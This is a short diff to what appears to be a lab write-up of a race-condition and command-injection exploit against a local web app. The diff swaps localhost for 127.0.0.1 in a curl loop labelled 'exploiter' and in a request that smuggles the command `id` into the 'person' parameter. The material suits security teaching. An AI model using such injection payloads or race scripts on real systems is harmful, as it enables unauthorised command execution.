@@ -155,8 +155,8 @@ Doing it manually is practically impossible, so we create a script that does tha
 while true; do 
 
 	curl -i -s -k  -X $'GET' \
-	    -H $'Host: localhost:5000' -H $'User-Agent: Semen Rozhkov exploiter v1.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
-	    $'http://localhost:5000/?action=run' | grep "Check this out"
+	    -H $'Host: 127.0.0.1:5000' -H $'User-Agent: Semen Rozhkov exploiter v1.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
+	    $'http://127.0.0.1:5000/?action=run' | grep "Check this out"
 done
 
 ```
@@ -164,7 +164,7 @@ done
 and in the meantime we send the other request from the browser like
 
 ```
-http://localhost:5000/?person=Default+User`id`&action=validate 
+http://127.0.0.1:5000/?person=Default+User`id`&action=validate 
 ```
 
 If we look in the logs we will see:
